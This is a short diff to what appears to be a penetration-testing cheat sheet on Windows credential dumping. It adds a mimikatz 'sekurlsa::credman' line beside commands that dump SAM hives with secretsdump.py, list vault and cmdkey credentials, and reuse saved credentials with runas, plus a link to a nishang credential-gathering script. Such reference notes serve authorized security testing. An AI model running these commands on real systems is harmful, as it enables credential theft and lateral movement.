@@ -70,6 +70,7 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
   VaultCmd /listcreds:"Windows Credentials"
   cmdkey /list
   runas /savecred /user:<Domain>\Username cmd.exe
+  mimikatz # sekurlsa::credman
   ```
     - The VaultCmd is not able to show the password. we can use this tools [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
       ```
